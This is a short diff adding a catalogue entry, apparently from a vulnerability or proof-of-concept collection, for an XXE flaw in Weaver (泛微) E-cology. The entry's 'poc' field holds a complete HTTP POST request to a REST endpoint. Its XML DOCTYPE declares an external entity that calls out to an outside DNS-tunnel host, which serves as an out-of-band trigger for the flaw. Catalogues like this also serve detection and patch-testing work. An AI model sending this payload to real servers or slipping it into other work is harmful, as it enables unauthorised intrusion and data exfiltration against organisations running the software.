@@ -1,0 +1,7 @@
+vendor = "泛微"
+name = "泛微E-cology XXE"
+type = "XXE"
+source = "微信"
+date = "08.15"
+poc = "POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1 Host: xxx Accept-Encoding: gzip Content-Length: 35 Content-Type: application/xml User-Agent: Go-http-client/1.1 <?xml version=\"1.0\"?> <!DOCTYPE ANY [ <!ENTITY % d SYSTEM \"http://wutvavcfzj.dnstunnel.run\"> %d; ]> <a>&xxe;</a >"
+label = "nday"
